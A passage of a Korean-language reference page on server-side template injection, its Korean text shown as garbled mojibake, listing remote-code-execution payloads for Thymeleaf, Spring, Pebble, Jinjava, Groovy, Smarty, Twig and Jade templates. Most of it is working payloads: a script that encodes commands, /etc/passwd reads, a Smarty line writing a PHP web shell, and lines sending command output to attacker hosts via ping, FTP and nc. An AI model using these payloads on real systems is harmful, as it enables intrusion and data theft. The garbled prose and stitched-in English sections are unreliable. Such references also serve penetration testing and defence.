ì´ëŠ” í…œí”Œë¦¿ ì—”ì§„ì´ ì´ëŸ¬í•œ ì…ë ¥ì„ ë¶€ì ì ˆí•˜ê²Œ ì²˜ë¦¬í•˜ëŠ” ê²½ìš°, ì›ê²© ì½”ë“œ ì‹¤í–‰ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ë‹¤ìŒê³¼ ê°™ì€ URLì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**ì¶”ê°€ ì •ë³´**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Spring Framework (Java)
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**í•„í„° ìš°íšŒ**

ì—¬ëŸ¬ ë³€ìˆ˜ í‘œí˜„ì‹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `${...}`ì´ ì‘ë™í•˜ì§€ ì•Šìœ¼ë©´ `#{...}`, `*{...}`, `@{...}` ë˜ëŠ” `~{...}`ì„ ì‹œë„í•´ë³´ì„¸ìš”.

* `/etc/passwd` ì½ê¸°
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* í˜ì´ë¡œë“œ ìƒì„±ì„ ìœ„í•œ ì‚¬ìš©ì ì •ì˜ ìŠ¤í¬ë¦½íŠ¸
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
```
**ì¶”ê°€ ì •ë³´**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### ìŠ¤í”„ë§ ë·° ì¡°ì‘ (Java)
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebble (Java)

* `{{ someString.toUPPERCASE() }}`

Pebbleì˜ ì´ì „ ë²„ì „ (< ë²„ì „ 3.0.9):
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
ìƒˆë¡œìš´ ë²„ì „ì˜ Pebble:
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}


{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
```
### Jinjava (ìë°”)

JinjavaëŠ” ìë°” ê¸°ë°˜ì˜ í…œí”Œë¦¿ ì—”ì§„ì…ë‹ˆë‹¤. ì´ ì—”ì§„ì€ ì„œë²„ ì¸¡ í…œí”Œë¦¿ ì£¼ì… (Server-Side Template Injection, SSTI) ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ ê³µê²©ìê°€ ì•…ì˜ì ì¸ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ê¸°íšŒë¥¼ ì œê³µí•©ë‹ˆë‹¤.

#### ì·¨ì•½ì  ì‹ë³„

Jinjavaë¥¼ ì‚¬ìš©í•˜ëŠ” ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ SSTI ì·¨ì•½ì ì„ ì°¾ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ íŠ¹ì§•ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- ì‚¬ìš©ì ì…ë ¥ì´ í…œí”Œë¦¿ ì—”ì§„ì— ì§ì ‘ ì „ë‹¬ë˜ëŠ” ê²½ìš°
- ì‚¬ìš©ì ì…ë ¥ì´ í…œí”Œë¦¿ ë³€ìˆ˜ë¡œ ì‚¬ìš©ë˜ëŠ” ê²½ìš°
- ì‚¬ìš©ì ì…ë ¥ì´ í…œí”Œë¦¿ í•„í„°ë¡œ ì‚¬ìš©ë˜ëŠ” ê²½ìš°

#### ê³µê²© ì‹œë‚˜ë¦¬ì˜¤

Jinjavaë¥¼ ì´ìš©í•œ SSTI ê³µê²©ì€ ë‹¤ìŒê³¼ ê°™ì€ ë‹¨ê³„ë¡œ ì§„í–‰ë©ë‹ˆë‹¤.

1. ì·¨ì•½í•œ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì‹ë³„í•©ë‹ˆë‹¤.
2. ì·¨ì•½ì ì„ ì°¾ê¸° ìœ„í•´ ì‚¬ìš©ì ì…ë ¥ì„ ì¡°ì‘í•©ë‹ˆë‹¤.
3. ì•…ì˜ì ì¸ í…œí”Œë¦¿ ì½”ë“œë¥¼ ì‚½ì…í•˜ì—¬ ì‹¤í–‰í•©ë‹ˆë‹¤.
4. ê²°ê³¼ë¥¼ í™•ì¸í•˜ê³  í•„ìš”í•œ ì •ë³´ë¥¼ ìˆ˜ì§‘í•©ë‹ˆë‹¤.

#### ë°©ì–´ ëŒ€ì±…

Jinjavaë¥¼ ì‚¬ìš©í•˜ëŠ” ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ SSTI ì·¨ì•½ì ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ ëŒ€ì±…ì„ ì ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- ì‚¬ìš©ì ì…ë ¥ì„ ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ê°’ìœ¼ë¡œ í•„í„°ë§í•˜ê±°ë‚˜ ì´ìŠ¤ì¼€ì´í”„ ì²˜ë¦¬í•©ë‹ˆë‹¤.
- í…œí”Œë¦¿ ì—”ì§„ì˜ ë³´ì•ˆ ì„¤ì •ì„ ê°•í™”í•©ë‹ˆë‹¤.
- ìµœì‹  ë²„ì „ì˜ Jinjavaë¥¼ ì‚¬ìš©í•˜ê³  ì·¨ì•½ì  íŒ¨ì¹˜ë¥¼ ì ìš©í•©ë‹ˆë‹¤.

#### ì¶”ê°€ ìë£Œ

- [Jinjava ê³µì‹ ë¬¸ì„œ](https://jinjava.github.io/jinjava/)
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
JinjavaëŠ” Hubspotì—ì„œ ê°œë°œí•œ ì˜¤í”ˆ ì†ŒìŠ¤ í”„ë¡œì íŠ¸ë¡œ, [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**Jinjava - ëª…ë ¹ ì‹¤í–‰**

[https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)ì—ì„œ ìˆ˜ì •ë˜ì—ˆìŠµë‹ˆë‹¤.
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**ì¶”ê°€ ì •ë³´**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* `{% %}` ë¬¸ êµ¬ë¶„ì
* `{{ }}` í‘œí˜„ì‹ êµ¬ë¶„ì
* `{# #}` ì£¼ì„ êµ¬ë¶„ì
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

"com.hubspot.content.hubl.context.TemplateContextRequest"ë¥¼ ê²€ìƒ‰í•˜ì—¬ [Githubì˜ Jinjava í”„ë¡œì íŠ¸](https://github.com/HubSpot/jinjava/)ë¥¼ ë°œê²¬í–ˆìŠµë‹ˆë‹¤.
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the



{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**ì¶”ê°€ ì •ë³´**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### í‘œí˜„ ì–¸ì–´ - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

í‘œí˜„ ì–¸ì–´ (EL)ì€ JavaEEì—ì„œ í”„ë ˆì  í…Œì´ì…˜ ë ˆì´ì–´(ì›¹ í˜ì´ì§€ì™€ ê°™ì€)ì™€ ì• í”Œë¦¬ì¼€ì´ì…˜ ë¡œì§(ê´€ë¦¬ë˜ëŠ” ë¹ˆê³¼ ê°™ì€) ê°„ì˜ ìƒí˜¸ ì‘ìš©ì„ ìš©ì´í•˜ê²Œ í•˜ëŠ” ê¸°ë³¸ ê¸°ëŠ¥ì…ë‹ˆë‹¤. ì´ëŠ” ì—¬ëŸ¬ JavaEE ê¸°ìˆ ì—ì„œ ë„ë¦¬ ì‚¬ìš©ë˜ì–´ ì´ëŸ¬í•œ í†µì‹ ì„ ê°„ì†Œí™”í•©ë‹ˆë‹¤. ELì„ ì‚¬ìš©í•˜ëŠ” ì£¼ìš” JavaEE ê¸°ìˆ ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

- **JavaServer Faces (JSF)**: ELì„ ì‚¬ìš©í•˜ì—¬ JSF í˜ì´ì§€ì˜ êµ¬ì„± ìš”ì†Œë¥¼ í•´ë‹¹í•˜ëŠ” ë°±ì—”ë“œ ë°ì´í„°ì™€ ì‘ì—…ì— ë°”ì¸ë”©í•©ë‹ˆë‹¤.
- **JavaServer Pages (JSP)**: JSPì—ì„œ ë°ì´í„°ì— ì•¡ì„¸ìŠ¤í•˜ê³  ì¡°ì‘í•˜ê¸° ìœ„í•´ ELì„ ì‚¬ìš©í•˜ì—¬ í˜ì´ì§€ ìš”ì†Œë¥¼ ì• í”Œë¦¬ì¼€ì´ì…˜ ë°ì´í„°ì— ì—°ê²°í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.
- **Contexts and Dependency Injection for Java EE (CDI)**: ELì€ CDIì™€ í†µí•©ë˜ì–´ ì›¹ ë ˆì´ì–´ì™€ ê´€ë¦¬ë˜ëŠ” ë¹ˆ ê°„ì˜ ì›í™œí•œ ìƒí˜¸ ì‘ìš©ì„ ê°€ëŠ¥í•˜ê²Œ í•˜ì—¬ ë” ì¼ê´€ëœ ì• í”Œë¦¬ì¼€ì´ì…˜ êµ¬ì¡°ë¥¼ ë³´ì¥í•©ë‹ˆë‹¤.

**EL í•´ì„ê¸°ì˜ ì•…ìš©**ì— ëŒ€í•´ ìì„¸íˆ ì•Œì•„ë³´ë ¤ë©´ ë‹¤ìŒ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Groovy (Java)

ë‹¤ìŒ ë³´ì•ˆ ê´€ë¦¬ì ìš°íšŒ ë°©ë²•ì€ ì´ [**ê¸°ì‚¬**](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/)ì—ì„œ ê°€ì ¸ì™”ìŠµë‹ˆë‹¤.
```java
//Basic Payload
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "ping cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net "
assert java.lang.Runtime.getRuntime().exec(cmd.split(" "))
})
def x

//Payload to get output
import groovy.*;
@groovy.transform.ASTTest(value={
cmd = "whoami";
out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".cq6qwx76mos92gp9eo7746dmgdm5au.burpcollaborator.net";
java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
})
def x

//Other payloads
new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x")
this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJpZCIpfSlkZWYgeA==")))
this.evaluate(new String(new byte[]{64, 103, 114, 111, 111, 118, 121, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 65, 83, 84, 84, 101, 115, 116, 40, 118, 97, 108, 117, 101, 61, 123, 97, 115, 115, 101, 114, 116, 32, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 46, 103, 101, 116, 82,117, 110, 116, 105, 109, 101, 40, 41, 46, 101, 120, 101, 99, 40, 34, 105, 100, 34, 41, 125, 41, 100, 101, 102, 32, 120}))
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ê´€ë ¨ì„± ìˆëŠ” ì‚¬ì´ë²„ ë³´ì•ˆ í–‰ì‚¬ì´ë©° **ìœ ëŸ½**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ í–‰ì‚¬ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ ì ì¸ ì§€ì‹ì„ ì´‰ì§„í•˜ëŠ” ë¯¸ì…˜**ì„ ê°€ì§€ê³  ìˆëŠ” ì´ íšŒì˜ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ  ë° ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì—ê²Œ ì—´ì •ì ì¸ ë§Œë‚¨ì˜ ì¥ì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

##


### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php} //deprecated in smarty v3
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{system('ls')} // compatible v3
{system('cat index.php')} // compatible v3
```
**ì¶”ê°€ ì •ë³´**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)ì˜ Smarty ì„¹ì…˜ì—ì„œ ë” ë§ì€ ì •ë³´ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)ì—ì„œë„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = Error`
* `{{foobar}} Nothing`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['id',""]|sort('system')}}

#Hide warnings and errors for automatic exploitation
{{["error_reporting", "0"]|sort("ini_set")}}
```
**Twig - í…œí”Œë¦¿ í˜•ì‹**

Twig is a popular template engine for PHP. It provides a secure and flexible way to render templates. Twig templates are written in a syntax that is easy to read and write.

Twigì€ PHPìš© ì¸ê¸°ìˆëŠ” í…œí”Œë¦¿ ì—”ì§„ì…ë‹ˆë‹¤. í…œí”Œë¦¿ì„ ë Œë”ë§í•˜ëŠ” ì•ˆì „í•˜ê³  ìœ ì—°í•œ ë°©ë²•ì„ ì œê³µí•©ë‹ˆë‹¤. Twig í…œí”Œë¦¿ì€ ì½ê³  ì“°ê¸° ì‰¬ìš´ êµ¬ë¬¸ìœ¼ë¡œ ì‘ì„±ë©ë‹ˆë‹¤.

**Server-Side Template Injection (SSTI)**

Server-Side Template Injection (SSTI) is a vulnerability that allows an attacker to inject malicious code into a server-side template. This can lead to remote code execution and other security risks.

ì„œë²„ ì¸¡ í…œí”Œë¦¿ ì‚½ì…(SSTI)ì€ ê³µê²©ìê°€ ì„œë²„ ì¸¡ í…œí”Œë¦¿ì— ì•…ì„± ì½”ë“œë¥¼ ì‚½ì…í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤. ì´ë¡œ ì¸í•´ ì›ê²© ì½”ë“œ ì‹¤í–‰ ë° ê¸°íƒ€ ë³´ì•ˆ ìœ„í—˜ì´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**Exploiting SSTI in Twig**

To exploit SSTI in Twig, an attacker needs to identify the injection point and craft a payload that will be executed by the template engine. The payload can include Twig template code and can be used to execute arbitrary commands or access sensitive information.

Twigì—ì„œ SSTIë¥¼ ì•…ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” ê³µê²©ìê°€ ì‚½ì… ì§€ì ì„ ì‹ë³„í•˜ê³  í…œí”Œë¦¿ ì—”ì§„ì—ì„œ ì‹¤í–‰ë  í˜ì´ë¡œë“œë¥¼ ì‘ì„±í•´ì•¼ í•©ë‹ˆë‹¤. í˜ì´ë¡œë“œì—ëŠ” Twig í…œí”Œë¦¿ ì½”ë“œê°€ í¬í•¨ë  ìˆ˜ ìˆìœ¼ë©°, ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•˜ê±°ë‚˜ ë¯¼ê°í•œ ì •ë³´ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**Preventing SSTI in Twig**

To prevent SSTI in Twig, it is important to properly validate and sanitize user input before using it in templates. Avoid using user input directly in template expressions and use Twig's built-in filters and functions to sanitize and escape user input.

Twigì—ì„œ SSTIë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•´ì„œëŠ” í…œí”Œë¦¿ì—ì„œ ì‚¬ìš©í•˜ê¸° ì „ì— ì‚¬ìš©ì ì…ë ¥ì„ ì˜¬ë°”ë¥´ê²Œ ìœ íš¨ì„± ê²€ì‚¬í•˜ê³  ì‚°í™”ì‹œì¼œì•¼ í•©ë‹ˆë‹¤. í…œí”Œë¦¿ í‘œí˜„ì‹ì—ì„œ ì‚¬ìš©ì ì…ë ¥ì„ ì§ì ‘ ì‚¬ìš©í•˜ì§€ ì•Šê³ , Twigì˜ ë‚´ì¥ í•„í„°ì™€ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©ì ì…ë ¥ì„ ì‚°í™”ì‹œí‚¤ê³  ì´ìŠ¤ì¼€ì´í”„í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤.
```php
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);

$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
```
**ì¶”ê°€ ì •ë³´**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)ì˜ Twig ë° Twig (Sandboxed) ì„¹ì…˜ì—ì„œ ë” ë§ì€ ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)ì—ì„œë„ ê´€ë ¨ ì •ë³´ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Plates (PHP)

PlatesëŠ” PHPì— ê¸°ë°˜í•œ í…œí”Œë¦¿ ì—”ì§„ìœ¼ë¡œ, Twigì—ì„œ ì˜ê°ì„ ë°›ì•˜ìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ Twigì™€ ë‹¬ë¦¬ PlatesëŠ” ìƒˆë¡œìš´ êµ¬ë¬¸ì„ ë„ì…í•˜ì§€ ì•Šê³  í…œí”Œë¦¿ì—ì„œ ê¸°ë³¸ PHP ì½”ë“œë¥¼ í™œìš©í•˜ì—¬ PHP ê°œë°œìì—ê²Œ ì§ê´€ì ì…ë‹ˆë‹¤.

ì»¨íŠ¸ë¡¤ëŸ¬:
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
í˜ì´ì§€ í…œí”Œë¦¿:
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
ë ˆì´ì•„ì›ƒ í…œí”Œë¦¿:
```html
<html>
<head>
<title><?=$this->e($title)?></title>
</head>
<body>
<?=$this->section('content')?>
</body>
</html>
```
**ì¶”ê°€ ì •ë³´**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates)

### PHPlibê³¼ HTML\_Template\_PHPLIB (PHP)

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB)ì€ PHPlibê³¼ ë™ì¼í•˜ì§€ë§Œ Pearë¡œ ì´ì‹ë˜ì—ˆìŠµë‹ˆë‹¤.

`authors.tpl`
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<caption>Authors</caption>
<thead>
<tr><th>Name</th><th>Email</th></tr>
</thead>
<tfoot>
<tr><td colspan="2">{NUM_AUTHORS}</td></tr>
</tfoot>
<tbody>
<!-- BEGIN authorline -->
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
</tbody>
</table>
</body>
</html>
```
# SSTI (Server-Side Template Injection)

## Authors

This page displays a list of authors. The authors' names are retrieved from a server-side template.

### Vulnerability

The vulnerability lies in the fact that the server-side template is not properly sanitized or validated. This allows an attacker to inject malicious code into the template, which is then executed on the server.

### Exploitation

To exploit this vulnerability, an attacker can inject template code that allows them to execute arbitrary commands or access sensitive information. The specific payload will depend on the template engine being used.

### Prevention

To prevent SSTI vulnerabilities, it is important to properly sanitize and validate all user input before using it in a server-side template. This can be done by using a secure template engine that automatically escapes user input or by manually sanitizing and validating the input.

### References

- [OWASP Server-Side Template Injection](https://owasp.org/www-community/attacks/Server-Side_Template_Injection)
- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
```php
<?php
//we want to display this author list
$authors = array(
'Christian Weiske'  => 'cweiske@php.net',
'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
$t->setVar('AUTHOR_NAME', $name);
$t->setVar('AUTHOR_EMAIL', $email);
$t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
**ì¶”ê°€ ì •ë³´**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib)

### Jade (NodeJS)
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**ì¶”ê°€ ì •ë³´**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)ì˜ Jade ì„¹ì…˜ì—ì„œ ë” ë§ì€ ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
